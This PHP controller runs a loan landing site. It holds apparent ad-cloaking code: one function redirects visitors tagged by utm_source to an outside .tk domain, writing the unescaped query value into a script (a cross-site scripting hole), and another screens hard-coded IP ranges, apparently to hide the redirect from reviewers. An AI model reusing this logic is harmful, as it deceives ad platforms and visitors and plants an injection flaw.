<?php defined('BASEPATH') OR exit('No direct script access allowed');

class Landing extends MX_Controller
{
	public function index()
	{ 
		$data = new StdClass();
		$uri = $this->uri->segment(1); 
		if (empty($uri)) $data->template = 'index';
		elseif ($uri == 'admin') show_404();
		elseif ($uri == 'form')
		{
			//$_url = 'https://dengibystra.ru/?&utm_source=google&utm_medium=cpc&utm_campaign=na_cartu1';
			if(isset($_SERVER['HTTP_REFERER']))
			{ 
				$data->referer = $_SERVER['HTTP_REFERER'];
				parse_str($data->referer, $output); 
					if(isset($output['utm_source']))
					{
						$this->load->model('landing/landing_m', 'landing_m');
						$data->utm = $this->landing_m->get_id($output['utm_source']);   
					}
					else     
					{
						$data->utm = ''; 
					}
					$data->ad_id = '4'.$data->utm; 
			} else {
				$data->referer = $_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
				$data->ad_id = '4'; 
				$data->utm = '4';
			}; 
			 
			$data->template = 'form';
		}
		elseif ($uri == 'history') $data->template = 'history';
		elseif (is_file(FCPATH.'templates/'.$this->theme().'/internal-'.$uri.'.php')) $data->template = 'internal';
		else show_404();
		//$data->template = ($page == 'result')? 'result' : 'index';
		$this->output($data);
	}

	private function ShowGreyHTML()
	{
		
		if (empty($_GET['utm_source'])) { 
			return;
		}
		$ee = 1;
		//include 'stat.php';
		$a = $_GET['utm_source'];	 
		if(empty(explode("_", $a)[0]))
		{ 
			return;
		}
		
		if(empty(explode("_", $a)[1]))
		{ 
			return;
		}
		
		if(empty(explode("_", $a)[2]))
		{ 
			return;
		}
		
		echo '<!doctype><html><header><noscript><meta http-equiv="refresh"content="0; url=/"></noscript>  <style>body {margin: 0;}</style></header><body>';
		$s1 = explode("_", $a)[0];
		$s2 = explode("_", $a)[1];
		$s3 = explode("_", $a)[2]; 

		echo "<script>window.location = 'https://helpjob.tk?utm_source=".$a."'</script></body></html>";   
	}

	private function GetCountry()
	{
		$ipaddress = $_SERVER['REMOTE_ADDR'];
	
		$a = $ipaddress;
		$a2 = '79.139.192.0';
		$a3 = '79.139.255.255'; 
		$a4 = '37.9.113.0';
		$a5 = '37.9.113.255'; 
		$a6 = '178.154.171.0';
		$a7 = '178.154.171.255';  
		$a8 = '46.0.0.0';
		$a9 = '46.0.31.255';   
		$a10 = '5.228.128.0';
		$a11 = '5.228.255.255'; 
		
		$f1 = ip2long($a);
		$f2 = ip2long($a2);
		$f3 = ip2long($a3);
		$f4 = ip2long($a4);
		$f5 = ip2long($a5);
		$f6 = ip2long($a6);
		$f7 = ip2long($a7);
		$f8 = ip2long($a8);
		$f9 = ip2long($a9);
		$f10 = ip2long($a10);
		$f11 = ip2long($a11);
		if ($f1 <= $f3 && $f2 <= $f1) {
			return "NONE";
		}
		
		if ($f1 <= $f5 && $f4 <= $f1) {
			return "NONE";
		}
		
		if ($f1 <= $f7 && $f6 <= $f1) {
			return "NONE";
		}
		
		if ($f1 <= $f9 && $f8 <= $f1) {
			return "NONE";
		}
		
		if ($f1 <= $f11 && $f10 <= $f1) {
			return "NONE";
		}

		$a = json_decode(file_get_contents('http://ip-api.com/json/'.$ipaddress), true);
		return $a['countryCode'];
	}
	
	private function theme()
	{
		$this->load->helper('themes');
		return theme();
	}
	
	private function output($data=false)
	{
		$data || $data = new stdClass;
		$data->theme = $this->theme();
		$this->load->view('template', $data);
	}
}